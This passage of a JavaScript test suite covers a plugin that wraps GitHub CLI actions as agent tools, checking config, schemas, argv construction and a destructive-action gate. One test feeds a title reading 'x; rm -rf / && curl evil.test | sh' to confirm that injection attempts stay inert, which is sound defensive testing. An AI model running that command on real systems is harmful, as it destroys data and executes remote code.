/**
 * Offline tests: schema subset compliance, config clamping, argv construction
 * for every action, destructive-gate enforcement, and the result contract.
 *
 * Runs with `node --test test/offline.test.mjs` (via `npm test`, which supplies
 * the resolver hook). No network, no gh binary, no dsh runtime.
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'

import { normalizeConfig, clampTimeout, MAX_TIMEOUT_MS, MIN_TIMEOUT_MS } from '../lib/config.js'
import {
  findSchemaViolations,
  RESULT_KEYS,
  RESULT_VALUE_SCHEMA,
} from '../lib/schema.js'
import { Config as ConfigSchema } from '../lib/config-schema.js'
import { DOMAINS } from '../lib/registry.js'
import { makeContext, makeRunner, testConfig, call, keywordsOf } from './helpers.mjs'
import { registerDomainTools } from '../lib/registry.js'
// Static, so the module-level `branchRoute` helper can see the constants. The
// per-test dynamic imports of `installClientBridge` stay: they are what the tests
// exercise, and this module has no side effects.
import { BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } from '../lib/client-bridge.js'

/** Every domain reachable in the default (permissive) configuration. */
const ALL_DOMAINS = DOMAINS

/**
 * Pick the branch route out of what the plugin registered.
 *
 * By path, not by index: the plugin now registers a diagnostics route too, and an
 * index would silently start asserting against the wrong handler the moment the
 * registration order changes.
 *
 * @param {any[]} routes the registered routes
 * @returns {any} the branch route
 */
function branchRoute(routes) {
  const found = routes.find((route) => route.path === BRANCH_ROUTE)
  assert.ok(found, `the branch route ${BRANCH_ROUTE} must be registered among ${routes.map((r) => r.path).join(', ')}`)
  return found
}

test('config: blank input resolves to usable defaults', () => {
  const cfg = normalizeConfig(undefined)
  assert.equal(cfg.timeoutMs, 60_000)
  assert.equal(cfg.watchTimeoutMs, 300_000)
  assert.equal(cfg.maxOutputBytes, 65_536)
  assert.equal(cfg.credentialRef, 'GITHUB_TOKEN')
  assert.equal(cfg.allowDestructive, true)
  assert.equal(cfg.allowRawApi, true)
  assert.equal(cfg.blockShellGit, false)
  assert.equal(cfg.verifyGhVersion, true)
  assert.equal(cfg.minGhVersion, '2.0.0')
  assert.deepEqual(cfg.env, {})
})

test('config: a non-finite or non-positive timeout cannot reach setTimeout as NaN', () => {
  // setTimeout(fn, NaN) fires after ~1ms in Node, so an unclamped NaN would
  // turn every command into an instant timeout.
  for (const bad of [Number.NaN, Number.POSITIVE_INFINITY, -5, 0, 'abc', null, undefined]) {
    assert.equal(clampTimeout(bad, 60_000), 60_000, `clampTimeout(${String(bad)})`)
  }
  assert.equal(clampTimeout(500, 60_000), 60_000, 'below the minimum falls back')
  assert.equal(clampTimeout(1_500, 60_000), 1_500)
  assert.equal(clampTimeout(9_999_999, 60_000), MAX_TIMEOUT_MS, 'above the maximum clamps')
  assert.equal(clampTimeout(MIN_TIMEOUT_MS, 60_000), MIN_TIMEOUT_MS, 'the minimum is inclusive')
})

test('config: a zero or negative output cap falls back instead of truncating everything', () => {
  assert.equal(normalizeConfig({ maxOutputBytes: 0 }).maxOutputBytes, 65_536)
  assert.equal(normalizeConfig({ maxOutputBytes: -1 }).maxOutputBytes, 65_536)
  assert.equal(normalizeConfig({ maxOutputBytes: 2048 }).maxOutputBytes, 2048)
  assert.equal(normalizeConfig({ maxOutputBytes: 2048.7 }).maxOutputBytes, 2048)
})

test('config: string keys are trimmed and blank values fall back', () => {
  assert.equal(normalizeConfig({ credentialRef: '  MY_TOKEN  ' }).credentialRef, 'MY_TOKEN')
  assert.equal(normalizeConfig({ credentialRef: '   ' }).credentialRef, 'GITHUB_TOKEN')
  assert.equal(normalizeConfig({ defaultRepo: '' }).defaultRepo, '')
  assert.equal(normalizeConfig({ apiBaseURL: 'https://ghe.example.com/api/v3/' }).apiBaseURL, 'https://ghe.example.com/api/v3')
})

test('config: env keeps only string values', () => {
  const cfg = normalizeConfig({ env: { A: 'x', B: 1, C: null, D: 'y' } })
  assert.deepEqual(cfg.env, { A: 'x', D: 'y' })
})

test('config: deviceFlowClientId is empty by default (never ships someone else\'s App)', () => {
  assert.equal(normalizeConfig(undefined).deviceFlowClientId, '')
})

test('config schema: the row schema validates through the Standard Schema interface', () => {
  // Cordis validates the row's config with this schema at activation, so the
  // schema itself is a load-time contract and is tested directly.
  const validate = (input) => ConfigSchema['~standard'].validate(input)

  const populated = validate({})
  assert.equal(populated.issues, undefined, `defaults must validate: ${JSON.stringify(populated.issues)}`)
  assert.equal(populated.value.timeoutMs, 60_000)
  assert.equal(populated.value.credentialRef, 'GITHUB_TOKEN')
  assert.equal(populated.value.allowRawApi, true)
  assert.deepEqual(populated.value.env, {})
})

test('config schema: invalid values are rejected at load time, not silently defaulted', () => {
  const validate = (input) => ConfigSchema['~standard'].validate(input)
  const rejected = [
    [{ timeoutMs: 'abc' }, 'a non-numeric timeout'],
    [{ timeoutMs: 10 }, 'a timeout below the minimum'],
    [{ timeoutMs: 10_000_000 }, 'a timeout above the maximum'],
    [{ maxOutputBytes: 0 }, 'a zero output cap'],
    [{ defaultRepo: 'not-a-repo' }, 'a malformed defaultRepo'],
    [{ defaultRepo: 'a/b/c' }, 'a defaultRepo with extra segments'],
    [{ credentialRef: 'lowercase' }, 'a credential ref that is not ENV shaped'],
    [{ env: { A: 1 } }, 'a non-string env value'],
    [{ blockShellGit: 'yes' }, 'a non-boolean switch'],
  ]
  for (const [input, label] of rejected) {
    const result = validate(input)
    assert.ok(
      result.issues !== undefined && result.issues.length > 0,
      `${label} must be rejected, got ${JSON.stringify(result.value)}`,
    )
  }
})

test('config schema: every declared key has a default and survives an empty row', () => {
  const validate = (input) => ConfigSchema['~standard'].validate(input)
  const { value } = validate({})
  for (const key of [
    'ghPath', 'gitPath', 'defaultRepo', 'verifyGhVersion', 'minGhVersion', 'credentialRef',
    'timeoutMs', 'watchTimeoutMs', 'maxOutputBytes', 'killGraceMs', 'apiBaseURL', 'authBaseURL',
    'deviceFlowClientId', 'deviceFlowScope', 'allowDestructive', 'allowRawApi', 'blockShellGit', 'env',
  ]) {
    assert.ok(key in value, `${key} must have a default`)
  }
})

test('schema: the COMPILED result value schema stays inside the enforced subset', async () => {
  // The DSL source (`type: 'json'`) is author syntax, not a JSON Schema type;
  // what the registry receives is defineTool's compiled output, so that is what
  // must be subset-clean. This compiles through the real defineTool.
  const { defineTool } = await import('@deepseek-ai/dsh-tools')
  const { RESULT_VALUE_SCHEMA: valueSchema } = await import('../lib/schema.js')
  const tool = defineTool({
    name: 'probe_result_schema',
    description: 'schema probe',
    parameters: { action: { type: 'string', required: true, description: 'x' } },
    output: { schema: valueSchema, render: () => [] },
    async execute() { return null },
  })
  assert.deepEqual(findSchemaViolations(tool.output.schema), [])
  // `data` is unconstrained, so it must compile to an annotation-only node
  // (no `type`), which the subset accepts.
  assert.equal(tool.output.schema.properties.data.type, undefined)
  assert.equal(typeof tool.output.schema.properties.data.description, 'string')
  assert.equal(tool.output.schema.properties.ok.type, 'boolean')
})

test('schema: the violation walker actually rejects unsupported keywords', () => {
  // A guard against the test passing because the walker never reports anything.
  assert.deepEqual(findSchemaViolations({ type: 'string', pattern: '^a' }), ['#: unsupported keyword "pattern"'])
  assert.deepEqual(findSchemaViolations({ type: 'string', minLength: 1 }), ['#: unsupported keyword "minLength"'])
  assert.deepEqual(findSchemaViolations({ anyOf: [] }), ['#: unsupported keyword "anyOf"'])
  assert.equal(findSchemaViolations({ type: 'string', description: 'ok', title: 't' }).length, 0)
  assert.deepEqual(findSchemaViolations({ type: 'nonsense' }), ['#: "type" must be one of object/array/string/number/integer/boolean/null'])
  assert.deepEqual(findSchemaViolations({ properties: { a: { format: 'date' } } }), ['#.properties.a: unsupported keyword "format"'])
})

test('schema: the DSL parameter map uses only DSL keywords', () => {
  // The DSL is compiled by defineTool; an unknown key would throw at
  // registration. This catches it in review rather than at plugin load.
  const DSL_KEYS = new Set([
    'type', 'required', 'description', 'enum', 'items', 'properties',
    'additionalProperties', 'oneOf', 'const', 'title', 'default', 'examples',
  ])
  for (const domain of ALL_DOMAINS) {
    for (const [name, spec] of Object.entries(domain.params)) {
      for (const keyword of keywordsOf(spec)) {
        assert.ok(DSL_KEYS.has(keyword), `${domain.tool}.${name} uses non-DSL keyword "${keyword}"`)
      }
    }
  }
})

test('registry: registers every tool, including the gated one, under the default config', () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  const registered = registerDomainTools(ctx, testConfig(), runner)
  // allowRawApi defaults to true, so the gated github_api tool IS registered.
  const expected = ALL_DOMAINS.map((d) => d.tool)
  assert.deepEqual(registered, expected)
  assert.deepEqual([...tools.keys()].sort(), [...expected].sort())
})

test('registry: the gated github_api tool is absent when allowRawApi is false', () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig({ allowRawApi: false }), runner)
  assert.equal(tools.has('github_api'), false)
  assert.equal(tools.has('github_pr'), true)
})

test('registry: every registered tool declares a description and a closed action enum', () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  for (const [toolName, definition] of tools) {
    assert.equal(typeof definition.description, 'string')
    assert.ok(definition.description.length > 40, `${toolName} description is too short to guide a model`)
    // defineTool compiled the DSL into raw JSON Schema: `action` is required and
    // its enum is the closed action set.
    assert.deepEqual(definition.parameters.required, ['action'])
    assert.equal(definition.parameters.type, 'object')
    assert.ok(Array.isArray(definition.parameters.properties.action.enum))
    assert.equal(typeof definition.output.render, 'function')
    assert.equal(typeof definition.execute, 'function')
  }
})

test('registry: defineTool compiles every parameter into the enforced schema subset', () => {
  // The compiled schema is what the registry receives; an out-of-subset
  // keyword would be rejected with UNSUPPORTED_SCHEMA at plugin load.
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  for (const [toolName, definition] of tools) {
    assert.deepEqual(findSchemaViolations(definition.parameters), [], `${toolName} parameters`)
    assert.deepEqual(findSchemaViolations(definition.output.schema), [], `${toolName} output schema`)
  }
})

test('registry: an unknown action is rejected by argument validation, not executed', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  // defineTool wraps execute with validation, so an out-of-enum action throws
  // an argument error before any command is constructed.
  await assert.rejects(
    () => call(tools.get('github_pr'), { action: 'not-a-real-action' }),
    /invalid arguments|must be one of/i,
  )
  assert.equal(calls.gh.length, 0, 'nothing may run for a rejected action')
})

test('registry: the parameter DSL rejects wrong argument types before execute', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const cases = [
    [tools.get('github_issue'), { action: 'create', repo: 'a/b', title: 't', labels: 'not-an-array' }, 'a string for an array parameter'],
    [tools.get('github_pr'), { action: 'view', repo: 'a/b', number: 'seven' }, 'a string for an integer parameter'],
    [tools.get('github_repo'), { repo: 'a/b' }, 'a missing required action'],
    [tools.get('github_repo'), { action: 'view', repo: 'a/b', confirm: 'yes' }, 'a string for a boolean parameter'],
  ]
  for (const [definition, args, label] of cases) {
    await assert.rejects(() => call(definition, args), /invalid arguments/i, label)
  }
  assert.equal(calls.gh.length, 0, 'no invalid call may reach the runner')
})

test('registry: a well-formed call still reaches the runner', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_issue'), {
    action: 'create',
    repo: 'a/b',
    title: 't',
    labels: ['bug'],
    // `issue create` is a destructive action since R3 — it creates an issue — so
    // a well-formed call for it must state the intent the gate asks for.
    confirm: true,
  })
  assert.equal(result.ok, true)
  assert.equal(calls.gh.length, 1)
})

test('registry: the array-parameter bug class is closed', async () => {
  // Before the DSL migration a raw JSON Schema left validation to the tool, so
  // `labels: "bug"` would have been spread into the characters "b","u","g" and
  // sent as three separate --label arguments.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  await assert.rejects(() => call(tools.get('github_issue'), {
    action: 'create', repo: 'a/b', title: 't', labels: 'bug',
  }))
  assert.equal(calls.gh.length, 0, 'a string must never be spread into arguments')
})

test('gate: a destructive action is refused without confirm', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_repo'), { action: 'delete', repo: 'a/b' })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /destructive/)
  assert.match(result.stderr, /confirm: true/)
  assert.equal(calls.gh.length, 0, 'nothing may run before the gate passes')
})

test('gate: a destructive action is refused when the config switch is off, even with confirm', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ allowDestructive: false }), runner)
  const result = await call(tools.get('github_repo'), { action: 'delete', repo: 'a/b', confirm: true })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /allowDestructive: false/)
  assert.equal(calls.gh.length, 0)
})

test('gate: a destructive action runs once confirm is given', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_repo'), { action: 'delete', repo: 'a/b', confirm: true })
  assert.equal(result.ok, true)
  // The target is the positional: `gh repo delete [<repository>]` has no --repo
  // flag, unlike `gh repo rename`.
  assert.deepEqual(calls.gh, [['repo', 'delete', 'a/b', '--yes']])
})

test('gate: a missing required parameter is refused with the parameter named', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  // `confirm` is supplied because the destructive gate runs BEFORE the `needs`
  // gate; without it the refusal would be about confirmation, not about `title`.
  const result = await call(tools.get('github_issue'), { action: 'create', repo: 'a/b', confirm: true })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /requires parameter `title`/)
  assert.equal(calls.gh.length, 0)
})

test('gate: every action marked destructive refuses without confirm', async () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  /** @type {string[]} */
  const checked = []
  for (const domain of ALL_DOMAINS) {
    const definition = tools.get(domain.tool)
    if (definition === undefined) continue
    for (const [actionName, action] of Object.entries(domain.actions)) {
      if (action.destructive !== true) continue
      checked.push(`${domain.tool}.${actionName}`)
      // Provide every plausible required parameter so the destructive gate is
      // the first one to fire, not the `needs` gate.
      const args = { action: actionName }
      for (const key of action.needs ?? []) args[key] = key === 'number' ? 1 : 'x'
      if (domain.globalRepoFlag === true || action.requiresRepo === true) args.repo = 'a/b'
      // `pr review` needs a verdict flag, which is not an argv value: without one
      // it fails validation for a reason unrelated to this gate.
      if (domain.tool === 'github_pr' && actionName === 'review') args.reviewAction = 'approve'
      const result = await call(definition, args)
      assert.equal(result.ok, false, `${domain.tool}.${actionName} should be refused`)
      assert.match(result.stderr, /destructive|confirm/, `${domain.tool}.${actionName}: ${result.stderr}`)
    }
  }
  assert.ok(checked.length >= 20, `expected many destructive actions, saw ${checked.length}: ${checked.join(', ')}`)
})

test('gate: a repository-requiring action fails clearly when nothing resolves', async () => {
  const { ctx, tools } = makeContext()
  // git reports no remotes, so no workspace repository can be detected.
  const { runner, calls } = makeRunner({ onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: '', stderr: '', truncated: false, spillPath: '' }) })
  registerDomainTools(ctx, testConfig({ defaultRepo: '' }), runner)
  const result = await call(tools.get('github_pr'), { action: 'view', number: 1 })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /requires a repository/)
  assert.equal(calls.gh.length, 0, 'no gh call may happen without a repository')
})

test('gate: an explicit repo argument wins over workspace detection', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  await call(tools.get('github_pr'), { action: 'view', repo: 'explicit/repo', number: 7 })
  assert.deepEqual(calls.gh, [[
    'pr', 'view', '7',
    '--repo', 'explicit/repo',
    '--json', 'number,title,body,state,headRefName,baseRefName,author,isDraft,mergeable,reviewDecision,url',
  ]])
})

test('gate: the configured defaultRepo is used when the argument is absent', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'cfg/repo' }), runner)
  await call(tools.get('github_issue'), { action: 'view', number: 3 })
  const argv = calls.gh[0]
  assert.deepEqual(argv.slice(0, 3), ['issue', 'view', '3'])
  assert.deepEqual(argv.slice(-4, -2), ['--repo', 'cfg/repo'])
})

test('gate: the workspace git remote is used when nothing else resolves', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner({
    onGit: (argv) => {
      const stdout = argv[0] === 'remote' && argv.length === 1
        ? 'origin\n'
        : argv[0] === 'remote' && argv[1] === 'get-url'
          ? 'git@github.com:ws/repo.git\n'
          : ''
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout, stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig({ defaultRepo: '' }), runner)
  await call(tools.get('github_pr'), { action: 'view', number: 2 })
  const argv = calls.gh[0]
  assert.ok(argv.includes('--repo'), 'the detected repository must reach gh')
  assert.equal(argv[argv.indexOf('--repo') + 1], 'ws/repo')
})

test('argv: --repo reaches gh for every global-repo domain', async () => {
  // gh accepts the persistent --repo flag in any position (verified against gh
  // 2.89.0), so the plugin appends it. This asserts it is always present and
  // always carries the resolved repository.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)
  const cases = [
    ['github_pr', { action: 'list' }],
    ['github_issue', { action: 'list' }],
    ['github_release', { action: 'list' }],
    ['github_actions', { action: 'list' }],
  ]
  for (const [tool, args] of cases) {
    calls.gh.length = 0
    await call(tools.get(tool), args)
    const argv = calls.gh[0]
    const index = argv.indexOf('--repo')
    assert.ok(index !== -1, `${tool}: --repo is missing`)
    assert.equal(argv[index + 1], 'o/r', `${tool}: --repo must carry the resolved repository`)
  }
})

test('gate: a long action uses the watch timeout, a normal one the default', async () => {
  const { ctx, tools } = makeContext()
  /** @type {number[]} */
  const timeouts = []
  const { runner } = makeRunner({
    onGh: (argv, options) => {
      timeouts.push(options.timeoutMs)
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig({ timeoutMs: 11_000, watchTimeoutMs: 222_000 }), runner)
  await call(tools.get('github_actions'), { action: 'runView', repo: 'a/b', runId: '5' })
  await call(tools.get('github_actions'), { action: 'runLog', repo: 'a/b', runId: '5' })
  assert.deepEqual(timeouts, [11_000, 222_000])
})

test('gate: a per-call timeoutMs overrides the configured one', async () => {
  const { ctx, tools } = makeContext()
  /** @type {number[]} */
  const timeouts = []
  const { runner } = makeRunner({
    onGh: (argv, options) => {
      timeouts.push(options.timeoutMs)
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig({ timeoutMs: 11_000 }), runner)
  await call(tools.get('github_repo'), { action: 'view', repo: 'a/b', timeoutMs: 3_000 })
  assert.deepEqual(timeouts, [3_000])
})

test('gate: a domain-level check can reject with its own message', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_pr'), {
    action: 'merge',
    repo: 'a/b',
    number: -1,
    confirm: true,
  })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /positive integer/)
  assert.equal(calls.gh.length, 0)
})

test('gate: the issue close action refuses "not planned" without confirm', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  // `close` is destructive since R3, so the destructive gate answers first and its
  // message is the one a caller must act on. The `reason` check still runs once
  // the gate passes, which the next test covers.
  const result = await call(tools.get('github_issue'), { action: 'close', repo: 'a/b', number: 5, reason: 'not planned' })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /destructive|confirm: true/)
  assert.equal(calls.gh.length, 0)
})

test('gate: the issue close "not planned" reason check still runs after the gate', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  // Two different refusals for two different reasons: this one names the reason,
  // which is the one that requires an explicit `confirm` in the domain's own check.
  const result = await call(tools.get('github_issue'), { action: 'close', repo: 'a/b', number: 5, reason: 'not planned', confirm: true })
  assert.equal(result.ok, true, result.stderr)
  assert.equal(calls.gh.length, 1)
})

test('gate: an authentication failure gains an actionable hint', async () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner({
    onGh: () => ({ ok: false, exitCode: 1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'gh: To get started with GitHub CLI, please run: gh auth login', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_repo'), { action: 'view', repo: 'a/b' })
  assert.equal(result.ok, false)
  assert.match(result.stderr, /\[hint\]/)
  assert.match(result.stderr, /github_auth/)
})

test('gate: a missing gh executable surfaces as a thrown GhMissingError', async () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner({
    onGh: () => ({ ok: false, exitCode: -1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'failed to spawn gh: ENOENT', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig(), runner)
  await assert.rejects(
    () => call(tools.get('github_repo'), { action: 'view', repo: 'a/b' }),
    /GitHub CLI \(gh\) is not available/,
  )
})

test('argv: no constructed argument array ever contains a shell metacharacter sequence', async () => {
  // The safety model is "argv array, shell: false". This asserts the arrays stay
  // arrays of discrete strings, and that a hostile-looking value stays one
  // single argument rather than being split.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const hostile = 'x; rm -rf / && curl evil.test | sh'
  // `issue create` is destructive since R3, so the gate is answered first.
  await call(tools.get('github_issue'), { action: 'create', repo: 'a/b', title: hostile, confirm: true })
  const argv = calls.gh[0]
  assert.ok(argv.includes(hostile), 'the hostile string must survive as ONE argument')
  assert.equal(argv.filter((part) => part === hostile).length, 1)
  for (const part of argv) assert.equal(typeof part, 'string')
})

test('argv: github_api runs through gh api, never a direct fetch', async () => {
  // A direct fetch would introduce a second, differently-configured network
  // path (Node's CA store instead of the platform's), which fails on a machine
  // with TLS interception that the OS trusts. Routing through gh keeps one
  // credential chain and one trust configuration.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const result = await call(tools.get('github_api'), { action: 'request', path: '/repos/octocat/Hello-World' })
  assert.equal(result.ok, true)
  assert.deepEqual(calls.gh, [['api', '/repos/octocat/Hello-World', '--method', 'GET']])
  assert.equal(calls.git.length, 0)
})

test('github_api: query parameters are appended to the path so GET stays GET', async () => {
  // `gh api -f key=value` implies POST. Appending to the path avoids that trap.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  await call(tools.get('github_api'), { action: 'request', path: '/search/issues', query: 'q=is:open&per_page=5' })
  assert.deepEqual(calls.gh[0], ['api', '/search/issues?q=is%3Aopen&per_page=5', '--method', 'GET'])
})

test('github_api: a body is passed on stdin and never appears in argv', async () => {
  const { ctx, tools } = makeContext()
  /** @type {any[]} */
  const options = []
  const { runner, calls } = makeRunner({
    onGh: (argv, opts) => {
      options.push(opts)
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '{}', stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig(), runner)
  const secretish = '{"title":"hello"}'
  await call(tools.get('github_api'), { action: 'request', path: '/repos/a/b/issues', method: 'POST', body: secretish, confirm: true })
  assert.ok(calls.gh[0].includes('--input'), 'the body must go through --input -')
  assert.ok(!calls.gh[0].some((part) => part.includes('hello')), 'the body must not appear in argv')
  assert.equal(options[0].stdin, secretish)
})

test('github_api: a write method needs confirm and the config switch', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  const noConfirm = await call(tools.get('github_api'), { action: 'request', path: '/x', method: 'DELETE' })
  assert.equal(noConfirm.ok, false)
  assert.match(noConfirm.stderr, /confirm: true/)
  assert.equal(calls.gh.length, 0)

  const { ctx: ctx2, tools: tools2 } = makeContext()
  const { runner: runner2, calls: calls2 } = makeRunner()
  registerDomainTools(ctx2, testConfig({ allowDestructive: false }), runner2)
  const switchedOff = await call(tools2.get('github_api'), { action: 'request', path: '/x', method: 'POST', confirm: true })
  assert.equal(switchedOff.ok, false)
  assert.match(switchedOff.stderr, /allowDestructive: false/)
  assert.equal(calls2.gh.length, 0)
})

test('github_api: an absolute URL or protocol-relative path is rejected', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  for (const path of ['https://evil.test/x', '//evil.test/x', 'repos/a/b', '/x\\y', '']) {
    const result = await call(tools.get('github_api'), { action: 'request', path })
    assert.equal(result.ok, false, `path ${JSON.stringify(path)} must be rejected`)
  }
  assert.equal(calls.gh.length, 0, 'no request may be issued for a rejected path')
})

test('github_api: paginate adds the flag and uses the watch timeout', async () => {
  const { ctx, tools } = makeContext()
  /** @type {any[]} */
  const options = []
  const { runner, calls } = makeRunner({
    onGh: (argv, opts) => {
      options.push(opts)
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '[]', stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig({ timeoutMs: 11_000, watchTimeoutMs: 222_000 }), runner)
  await call(tools.get('github_api'), { action: 'request', path: '/repos/a/b/branches', paginate: true })
  assert.ok(calls.gh[0].includes('--paginate'))
  assert.equal(options[0].timeoutMs, 222_000)
})

test('defineTool conformance: presentation, concurrency, and the background flag', async () => {
  // Everything here is a capability the official reference documents and a
  // shipped production plugin uses; the registry must actually declare them,
  // because a missing presenter silently degrades to the generic card and a
  // missing concurrency predicate silently serialises every call.
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)

  for (const [toolName, definition] of tools) {
    assert.equal(typeof definition.presentResult, 'function', `${toolName}: presentResult`)
    assert.equal(typeof definition.isConcurrencySafe, 'function', `${toolName}: isConcurrencySafe`)
    assert.equal(typeof definition.output.presentationMeta, 'function', `${toolName}: presentationMeta`)
    assert.equal(typeof definition.presentCall, 'function', `${toolName}: presentCall`)
  }

  // presentCall reports a real kind, not `other` for everything.
  assert.equal(tools.get('github_search').presentCall({ action: 'code' }).kind, 'search')
  assert.equal(tools.get('github_pr').presentCall({ action: 'view' }).kind, 'read')
  assert.equal(tools.get('github_pr').presentCall({ action: 'merge' }).kind, 'other')

  // Concurrency is per-ACTION, and an unrecognised action is never safe.
  const pr = tools.get('github_pr')
  assert.equal(pr.isConcurrencySafe({ action: 'view' }), true)
  assert.equal(pr.isConcurrencySafe({ action: 'merge' }), false)
  assert.equal(pr.isConcurrencySafe({ action: 'not-an-action' }), false)
  assert.equal(pr.isConcurrencySafe({}), false)
  // github_api reads or writes depending on its method argument, so it must
  // never be classified safe.
  assert.equal(tools.get('github_api').isConcurrencySafe({ action: 'request', method: 'GET' }), false)

  // The background flag is declared exactly where a long action exists.
  assert.ok('run_in_background' in tools.get('github_actions').parameters.properties)
  assert.ok('run_in_background' in tools.get('github_release').parameters.properties)
  assert.ok(!('run_in_background' in tools.get('github_search').parameters.properties))
  assert.equal(tools.get('github_actions').parameters.properties.run_in_background.type, 'boolean')
})

test('defineTool conformance: presentationMeta projects bounded card facts only', async () => {
  const { projectResultMeta } = await import('../lib/registry.js')
  assert.equal(typeof projectResultMeta, 'function')

  // A card fact set: no stdout, no stderr, no payload — just what a replayed
  // card needs, and always cloneable JSON.
  const withUrl = projectResultMeta({}, {
    ok: true,
    exitCode: 0,
    stdout: 'x'.repeat(5000),
    stderr: 'noise',
    data: { url: 'https://github.com/a/b/pull/1', number: 1, title: 't', body: 'long...' },
  })
  assert.deepEqual(withUrl, { ok: true, exitCode: 0, url: 'https://github.com/a/b/pull/1', number: 1 })
  assert.ok(!('stdout' in withUrl) && !('stderr' in withUrl) && !('data' in withUrl))

  // Non-object payloads, arrays, and absent data must not throw or leak.
  for (const data of [undefined, null, 'text', 42, [1, 2, 3]]) {
    const meta = projectResultMeta({}, { ok: false, exitCode: 1, data })
    assert.deepEqual(meta, { ok: false, exitCode: 1 })
  }

  // The projection must survive the registry's lossless-JSON clone.
  assert.equal(JSON.parse(JSON.stringify(withUrl)).url, 'https://github.com/a/b/pull/1')
})

test('defineTool conformance: presentResult names the outcome instead of falling back', async () => {
  const { presentResult } = await import('../lib/registry.js')
  assert.equal(presentResult({}, { meta: { ok: true, exitCode: 0, url: 'https://x/y' } }).title, 'GitHub · https://x/y')
  assert.match(presentResult({}, { meta: { ok: false, exitCode: 1 } }).title, /failed \(exit 1\)/)
  assert.match(presentResult({}, { meta: { ok: false, exitCode: -1, timedOut: true } }).title, /timed out/)
  // No meta at all must defer to the registry rather than invent a card.
  assert.equal(presentResult({}, {}), undefined)
  assert.equal(presentResult({}, { meta: null }), undefined)
})

test('concurrency classification: the read-only list cannot disagree with the destructive list', () => {
  // The guard that makes a per-domain list safe to maintain. A destructive
  // action silently classified as a parallel-safe read would be a real defect,
